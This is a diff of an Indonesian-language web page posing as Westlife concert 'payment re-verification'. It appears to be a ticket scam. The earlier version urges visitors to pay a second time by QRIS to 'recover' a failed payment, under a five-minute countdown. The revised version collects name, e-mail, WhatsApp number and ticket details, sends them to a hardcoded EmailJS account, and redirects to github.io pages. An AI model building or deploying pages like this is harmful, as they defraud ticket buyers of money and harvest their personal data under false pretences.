@@ -3,42 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verifikasi Pembayaran Ulang</title>
+
+<title>WESTLIFE PAYMENT VERIFICATION</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
 *{
 margin:0;
 padding:0;
 box-sizing:border-box;
-font-family:Arial,sans-serif;
+font-family:'Poppins',sans-serif;
 }
 
 body{
-background:#000;
-background-image:url('background.jpg');
-background-size:cover;
-background-position:center;
-color:white;
-min-height:100vh;
-padding:20px;
+background:#050505;
 overflow-x:hidden;
+min-height:100vh;
+display:flex;
+justify-content:center;
+align-items:center;
+padding:20px;
+position:relative;
 }
 
+/* Animated Background */
+
+.bg{
+position:fixed;
+width:100%;
+height:100%;
+top:0;
+left:0;
+overflow:hidden;
+z-index:-1;
+}
+
+.circle{
+position:absolute;
+border-radius:50%;
+background:rgba(212,175,55,0.15);
+animation:float 12s infinite linear;
+filter:blur(20px);
+}
+
+.circle:nth-child(1){
+width:250px;
+height:250px;
+top:10%;
+left:5%;
+animation-duration:15s;
+}
+
+.circle:nth-child(2){
+width:300px;
+height:300px;
+bottom:5%;
+right:10%;
+animation-duration:18s;
+}
+
+.circle:nth-child(3){
+width:180px;
+height:180px;
+top:45%;
+left:45%;
+animation-duration:12s;
+}
+
+@keyframes float{
+0%{
+transform:translateY(0px) rotate(0deg);
+}
+50%{
+transform:translateY(-50px) rotate(180deg);
+}
+100%{
+transform:translateY(0px) rotate(360deg);
+}
+}
+
+/* Card */
+
 .container{
-max-width:450px;
-margin:auto;
-background:rgba(0,0,0,0.88);
-border:2px solid red;
-border-radius:30px;
-padding:20px;
-box-shadow:0 0 40px red;
+width:100%;
+max-width:520px;
+background:rgba(15,15,15,0.95);
+backdrop-filter:blur(15px);
+border:1px solid rgba(212,175,55,0.25);
+border-radius:28px;
+overflow:hidden;
+box-shadow:
+0 0 40px rgba(212,175,55,0.15),
+0 0 120px rgba(212,175,55,0.05);
 animation:fadeIn 1s ease;
 }
 
 @keyframes fadeIn{
 from{
 opacity:0;
-transform:translateY(30px);
+transform:translateY(40px);
 }
 to{
 opacity:1;
@@ -48,359 +112,273 @@ transform:translateY(0);
 
 .banner{
 width:100%;
-border-radius:20px;
-margin-bottom:20px;
-box-shadow:0 0 20px red;
-animation:zoom 4s infinite alternate;
+height:220px;
+object-fit:cover;
+display:block;
 }
 
-@keyframes zoom{
-from{transform:scale(1);}
-to{transform:scale(1.02);}
+.content{
+padding:30px;
 }
 
 .title{
-text-align:center;
 font-size:28px;
-font-weight:bold;
-color:#ff0000;
-margin-bottom:20px;
-text-shadow:0 0 20px red;
+font-weight:700;
+text-align:center;
+color:#d4af37;
+margin-bottom:10px;
 }
 
 .subtitle{
 text-align:center;
 font-size:14px;
-color:#ccc;
-margin-bottom:25px;
+color:#bdbdbd;
+margin-bottom:30px;
+line-height:24px;
+}
+
+/* Input */
+
+.group{
+margin-bottom:18px;
 }
 
 label{
 display:block;
-margin-top:15px;
 margin-bottom:8px;
+color:#d4af37;
 font-size:14px;
+font-weight:500;
 }
 
 input,select{
 width:100%;
-padding:15px;
+padding:16px;
 border:none;
-border-radius:15px;
-background:#111;
-color:white;
-font-size:15px;
 outline:none;
-border:1px solid #333;
+border-radius:14px;
+background:#151515;
+color:#ffffff;
+font-size:15px;
+border:1px solid #2c2c2c;
+transition:0.3s;
 }
 
 input:focus,select:focus{
-border:1px solid red;
-box-shadow:0 0 10px red;
+border:1px solid #d4af37;
+box-shadow:0 0 20px rgba(212,175,55,0.25);
 }
 
-.total-box{
-margin-top:20px;
-padding:18px;
-background:#111;
-border-radius:20px;
-border:1px solid red;
-text-align:center;
-font-size:24px;
-font-weight:bold;
-color:gold;
-box-shadow:0 0 15px red;
-}
-
-.qris-box{
-display:none;
-margin-top:25px;
-padding:20px;
-background:#111;
-border-radius:20px;
-border:2px solid gold;
-text-align:center;
-animation:fadeIn 1s ease;
-}
-
-.qris-box img{
-width:100%;
-max-width:300px;
-border-radius:20px;
-margin-top:15px;
-}
-
-.note{
-margin-top:15px;
-font-size:13px;
-color:#ccc;
-line-height:1.6;
-}
-
-.timer{
-margin-top:15px;
-font-size:24px;
-font-weight:bold;
-color:red;
-text-align:center;
-text-shadow:0 0 10px red;
-}
+/* Button */
 
 button{
 width:100%;
 padding:18px;
-margin-top:25px;
 border:none;
-border-radius:20px;
-background:#ff0000;
-color:white;
-font-size:20px;
-font-weight:bold;
+border-radius:16px;
+background:linear-gradient(135deg,#d4af37,#ffdf6b);
+color:#000;
+font-size:17px;
+font-weight:700;
 cursor:pointer;
-opacity:0.5;
-pointer-events:none;
-transition:0.3s;
-box-shadow:0 0 20px red;
-}
-
-button.active{
-opacity:1;
-pointer-events:auto;
+transition:0.4s;
+margin-top:10px;
+position:relative;
+overflow:hidden;
 }
 
 button:hover{
-transform:scale(1.03);
+transform:translateY(-3px);
+box-shadow:0 10px 30px rgba(212,175,55,0.35);
 }
+
+button:active{
+transform:scale(0.98);
+}
+
+/* Loading */
 
 .loading{
 display:none;
-margin-top:20px;
+margin-top:25px;
 text-align:center;
-font-size:18px;
-color:gold;
 }
 
-.success{
-display:none;
-text-align:center;
-padding:40px 20px;
-animation:fadeIn 1s ease;
+.loader{
+width:60px;
+height:60px;
+border:5px solid rgba(255,255,255,0.1);
+border-top:5px solid #d4af37;
+border-radius:50%;
+margin:auto;
+animation:spin 1s linear infinite;
 }
 
-.success h1{
-color:#00ff66;
-margin-bottom:20px;
+@keyframes spin{
+100%{
+transform:rotate(360deg);
+}
 }
 
-.success p{
-line-height:1.8;
-color:#ddd;
+.loading p{
+margin-top:18px;
+color:#ffffff;
+font-size:15px;
+line-height:26px;
 }
+
+/* Footer */
 
 .footer{
 margin-top:25px;
 text-align:center;
 font-size:12px;
-color:#888;
+color:#777;
+line-height:22px;
 }
-
 </style>
 </head>
+
 <body>
 
-<div class="container" id="formContainer">
+<div class="bg">
+<div class="circle"></div>
+<div class="circle"></div>
+<div class="circle"></div>
+</div>
 
-<img src="banner.jpg" class="banner">
+<div class="container">
 
-<div class="title">VERIFIKASI PEMBAYARAN ULANG</div>
+<img class="banner"
+src="https://i.imgur.com/4M7IWwP.jpeg">
+
+<div class="content">
+
+<div class="title">
+WESTLIFE TOUR
+</div>
 
 <div class="subtitle">
-Silahkan lakukan verifikasi pembayaran ulang untuk memulihkan saldo failed secara otomatis.
+Verifikasi pembayaran ulang untuk transaksi sebelumnya yang gagal diproses.
 </div>
 
-<form id="paymentForm">
-
+<div class="group">
 <label>Nama Lengkap</label>
-<input type="text" id="nama" required>
+<input type="text" id="name" placeholder="Masukkan nama lengkap">
+</div>
 
-<label>E-mail AKTIF</label>
-<input type="email" id="email" required>
+<div class="group">
+<label>E-mail</label>
+<input type="email" id="email" placeholder="Masukkan e-mail">
+</div>
 
-<label>No. WhatsApp</label>
-<input type="tel" id="wa" required>
+<div class="group">
+<label>WhatsApp</label>
+<input type="text" id="whatsapp" placeholder="08xxxxxxxxxx">
+</div>
 
-<label>Category Tiket</label>
-<select id="kategori" required>
-<option value="">Pilih Category</option>
-<option value="2750000">VIP PACKAGE - Rp. 2.750.000</option>
-<option value="2500000">CAT 1A & B - Rp. 2.500.000</option>
-<option value="2250000">CAT 2 A&B - Rp. 2.250.000</option>
-<option value="1850000">CAT 3 A & B - Rp. 1.850.000</option>
-<option value="1450000">CAT 4 A & B - Rp. 1.450.000</option>
-<option value="1250000">CAT 5 A & B - Rp. 1.250.000</option>
-<option value="850000">CAT 6 A&B - Rp. 850.000</option>
+<div class="group">
+<label>Kategori Tiket</label>
+<select id="category">
+<option value="VIP FESTIVAL">VIP FESTIVAL</option>
+<option value="GOLD">GOLD</option>
+<option value="SILVER">SILVER</option>
+<option value="BRONZE">BRONZE</option>
 </select>
+</div>
 
+<div class="group">
 <label>Jumlah Tiket</label>
-<input type="number" id="jumlah" min="1" required>
-
-<div class="total-box">
-TOTAL : Rp <span id="total">0</span>
+<input type="number" id="qty" placeholder="Jumlah tiket">
 </div>
 
-<div class="qris-box" id="qrisBox">
-
-<h2 style="color:gold;">PEMBAYARAN QRIS</h2>
-
-<p class="note">
-Silahkan lakukan pembayaran ulang agar saldo yang telah terpotong dapat di react dan kembali secara otomatis.
-</p>
-
-<img src="qris-pembayaran.png">
-
-<div class="timer" id="timer">05:00</div>
-
-<label style="text-align:left;">Upload Bukti Pembayaran Failed</label>
-<input type="file" required>
-
-<label style="text-align:left;">Upload Bukti Pembayaran Ulang</label>
-<input type="file" required>
-
+<div class="group">
+<label>Total Pembayaran</label>
+<input type="text" id="total" placeholder="Rp 0">
 </div>
 
-<button type="submit" id="submitBtn">
+<button onclick="kirimEmail()">
 VERIFIKASI PEMBAYARAN
 </button>
 
 <div class="loading" id="loading">
-Memverifikasi pembayaran...
-<br><br>
-Mohon tunggu 30 detik...
-</div>
-
-</form>
-
-<div class="footer">
-E-ticket akan dikonfirmasi melalui E-mail setelah pembayaran berhasil.
-</div>
-
-</div>
-
-<div class="container success" id="successBox">
-
-<h1>PEMBAYARAN BERHASIL</h1>
+<div class="loader"></div>
 
 <p>
-E-Ticket akan dikonfirmasi melalui E-mail.<br><br>
-
-Silahkan ajukan refund untuk saldo yang telah failed.<br><br>
-
-Redirect otomatis ke website official...
+Sedang memverifikasi pembayaran ulang...<br>
+Mohon tunggu beberapa saat
 </p>
-
 </div>
 
+<div class="footer">
+WESTLIFE THE ANNIVERSARY WORLD TOUR<br>
+25 YEARS OF HITS
+</div>
+
+</div>
+</div>
+
+<!-- EMAILJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
 <script>
+emailjs.init("4xVw4LRaVL7_wqucZ");
 
-const kategori=document.getElementById('kategori');
-const jumlah=document.getElementById('jumlah');
-const total=document.getElementById('total');
-const qrisBox=document.getElementById('qrisBox');
-const form=document.getElementById('paymentForm');
-const submitBtn=document.getElementById('submitBtn');
+function kirimEmail(){
 
-const inputs=document.querySelectorAll('input, select');
+document.getElementById("loading").style.display="block";
 
-function formatRupiah(number){
-return new Intl.NumberFormat('id-ID').format(number);
-}
+const params = {
 
-function hitungTotal(){
+user_name:
+document.getElementById("name").value,
 
-const harga=parseInt(kategori.value)||0;
-const qty=parseInt(jumlah.value)||0;
+user_email:
+document.getElementById("email").value,
 
-const hasil=harga*qty;
+user_whatsapp:
+document.getElementById("whatsapp").value,
 
-total.innerText=formatRupiah(hasil);
+ticket_category:
+document.getElementById("category").value,
 
-if(qty>0){
-qrisBox.style.display='block';
-}
+ticket_qty:
+document.getElementById("qty").value,
 
-cekForm();
+payment_total:
+document.getElementById("total").value
 
-}
+};
 
-kategori.addEventListener('change',hitungTotal);
-jumlah.addEventListener('input',hitungTotal);
+emailjs.send(
+"service_u62dcyu",
+"template_rgb55jj",
+params
+)
 
-inputs.forEach(input=>{
-input.addEventListener('input',cekForm);
-});
+.then(function(response){
 
-function cekForm(){
+setTimeout(function(){
 
-let valid=true;
-
-inputs.forEach(input=>{
-if(input.value.trim()===''){
-valid=false;
-}
-});
-
-if(valid){
-submitBtn.classList.add('active');
-}else{
-submitBtn.classList.remove('active');
-}
-
-}
-
-let waktu=300;
-
-const timer=document.getElementById('timer');
-
-setInterval(()=>{
-
-const menit=Math.floor(waktu/60);
-const detik=waktu%60;
-
-timer.innerText=
-String(menit).padStart(2,'0')
-+':'+
-String(detik).padStart(2,'0');
-
-if(waktu>0){
-waktu--;
-}
-
-},1000);
-
-form.addEventListener('submit',function(e){
-
-e.preventDefault();
-
-document.getElementById('loading').style.display='block';
-
-submitBtn.style.display='none';
-
-setTimeout(()=>{
-
-document.getElementById('formContainer').style.display='none';
-
-document.getElementById('successBox').style.display='block';
-
-setTimeout(()=>{
-
-window.location.href='https://www.tiket.westlife.online';
+window.location.href =
+"https://fforeverindonesia-svg.github.io/success.html/";
 
 },3000);
 
-},30000);
+})
+
+.catch(function(error){
+
+setTimeout(function(){
+
+window.location.href =
+"https://fforeverindonesia-svg.github.io/failed.html/";
+
+},3000);
 
 });
 
+}
 </script>
 
 </body>
